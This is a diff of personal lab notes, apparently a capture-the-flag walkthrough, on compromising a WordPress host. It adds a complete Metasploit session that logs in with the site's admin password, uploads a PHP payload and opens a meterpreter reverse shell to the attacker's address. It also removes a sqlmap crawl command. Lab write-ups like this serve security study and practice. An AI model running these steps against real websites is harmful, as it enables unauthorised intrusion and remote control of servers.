@@ -170,21 +170,45 @@ I signed up for the free wpscan API and added that to my host. then reran wpscan
 
 Basically it showed 25 vulnerabilities but as we have admin access without launching going to use msf6
 
+**METASPLOIT**
+
+remember use and set commands also run and exploit
+
+as I am on a VPN set LHOST otherwise it uses non vpn address
+
+
+Google search for [metasploit wordpress reverse shell][msf6-commands]
+
 ```yaml
-P@s5w0rd!
+msf6 auxiliary > use exploit/unix/webapp/wp_admin_shell_upload 
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME admin
+USERNAME => admin
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD P@s5w0rd!
+PASSWORD => P@s5w0rd!
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set targeturi /wordpress
+targeturi => /wordpress
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS 10.10.10.29
+RHOSTS => 10.10.10.29
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set LHOST 10.10.14.87
+LHOST => 10.10.14.87
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.87:4444 
+[*] Authenticating with WordPress using admin:P@s5w0rd!...
+[+] Authenticated with WordPress
+[*] Preparing payload...
+[*] Uploading payload...
+[*] Executing the payload at /wordpress/wp-content/plugins/hWGKLAJXgv/rRORqnxhOH.php...
+[*] Sending stage (39282 bytes) to 10.10.10.29
+[*] Meterpreter session 1 opened (10.10.14.87:4444 -> 10.10.10.29:51869) at 2021-01-04 16:16:53 -0500
+[+] Deleted rRORqnxhOH.php
+[+] Deleted hWGKLAJXgv.php
+[!] This exploit may require manual cleanup of '../hWGKLAJXgv' on the target
+
+meterpreter > 
 ```
-
-
-
-
-
-Running SQLMAP:
-
-```yaml
-──(kali㉿kali)-[~]
-└─$ sqlmap -u ‘http://10.10.10.29/wordpress/index.php/2020/02/10/run-flat-tires/#comment-2’ --crawl=2
-
-```
+## YEA
 
 
 
@@ -196,3 +220,6 @@ Running SQLMAP:
 
 
 
+
+
+https://www.hackingarticles.in/wordpress-reverse-shell/[msf6-commands]:  
